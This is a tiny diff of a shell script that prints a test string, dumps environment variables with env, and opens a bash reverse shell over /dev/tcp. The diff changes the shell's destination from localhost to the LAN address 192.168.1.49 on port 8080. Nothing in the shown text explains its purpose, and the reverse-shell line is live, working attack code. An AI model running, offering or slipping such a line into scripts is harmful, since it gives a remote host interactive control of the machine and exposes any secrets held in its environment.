@@ -1,3 +1,3 @@
 echo "test1"
 env
-bash -i >& /dev/tcp/127.0.0.1/8081 0>&1
+bash -i >& /dev/tcp/192.168.1.49/8080 0>&1
